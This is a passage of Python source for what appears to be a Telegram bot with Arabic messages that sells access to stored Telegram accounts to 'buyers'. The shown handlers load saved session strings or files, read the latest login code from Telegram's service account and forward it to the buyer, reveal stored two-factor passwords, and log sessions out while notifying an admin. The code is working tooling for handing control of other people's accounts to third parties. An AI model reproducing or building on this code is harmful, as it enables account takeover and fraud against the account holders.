                f_name, s_data = row
                if s_data:
                    temp_client = TelegramClient(StringSession(s_data), API_ID, API_HASH)
                else:
                    f_path = os.path.join(SESSIONS_DIR, f_name)
                    if not os.path.exists(f_path):
                        await event.answer("❌ تعذر العثور على ملف السيشن!", alert=True)
                        return
                    temp_client = TelegramClient(f_path, API_ID, API_HASH)

                await event.answer("🔄 جاري قراءة الكود...", alert=False)
                try:
                    await asyncio.wait_for(temp_client.connect(), timeout=CONNECT_TIMEOUT)
                    messages = await safe_get_messages(temp_client, 777000, limit=1)
                    if messages and messages[0] and messages[0].text:
                        otp_code = re.search(r"\b\d{5,6}\b", messages[0].text)
                        if otp_code:
                            await bot.send_message(
                                user_id,
                                f"🔑 **كود التحقق الخاص بك:**\n`{otp_code.group(0)}`",
                            )
                        else:
                            await bot.send_message(user_id, f"📩 **نص الرسالة الواردة:**\n{messages[0].text}")
                    else:
                        await event.answer("❌ لم يصل كود جديد حتى الآن.", alert=True)
                    await temp_client.disconnect()
                except Exception as e:
                    await event.answer(f"❌ خطأ أثناء قراءة الكود: {str(e)}", alert=True)
            else:
                await event.answer("❌ تعذر العثور على السيشن!", alert=True)
            return

        if data.startswith(b"pass_"):
            session_id = data.decode().split("_")[1]
            async with db_lock:
                cursor.execute("SELECT password_2fa FROM sessions WHERE id = ?", (session_id,))
                row = cursor.fetchone()
            if row and row[0]:
                await event.answer(f"🔑 كلمة سر 2FA هي:\n{row[0]}", alert=True)
            else:
                await event.answer("🔑 كلمة سر 2FA هي:\nm", alert=True)
            return

        if data.startswith(b"logout_"):
            session_id = data.decode().split("_")[1]
            async with db_lock:
                cursor.execute("SELECT file_name, phone_number, session_data FROM sessions WHERE id = ?", (session_id,))
                row = cursor.fetchone()
            if row:
                f_name, phone_num, s_data = row
                if s_data:
                    temp_client = TelegramClient(StringSession(s_data), API_ID, API_HASH)
                else:
                    f_path = os.path.join(SESSIONS_DIR, f_name)
                    temp_client = TelegramClient(f_path, API_ID, API_HASH)

                try:
                    await asyncio.wait_for(temp_client.connect(), timeout=CONNECT_TIMEOUT)
                    if await temp_client.is_user_authorized():
                        await temp_client.log_out()
                    await temp_client.disconnect()

                    if not s_data:
                        f_path = os.path.join(SESSIONS_DIR, f_name)
                        if os.path.exists(f_path):
                            os.remove(f_path)

                    async with db_lock:
                        cursor.execute("UPDATE sessions SET status = 'user_logged_out' WHERE id = ?", (session_id,))
                        conn.commit()

                    await event.edit("✅ **تم تسجيل خروج البوت وحذف السيشن نهائياً.**")
                    await bot.send_message(
                        ADMIN_ID,
                        f"🚪 **قام المشتري بتسجيل خروج البوت يدوياً من الرقم:** `{phone_num}`",
                    )
                except Exception as e:
                    await event.answer(f"❌ خطأ: {str(e)}", alert=True)


# === التشغيل الرئيسي ===
async def main():
    bot = await TelegramClient("bot_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
    register_handlers(bot)
    asyncio.create_task(session_heartbeat_checker(bot))
    print("🚀 البوت يعمل بنجاح بالتوكن الجديد وبدون قارات!")
    await bot.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())
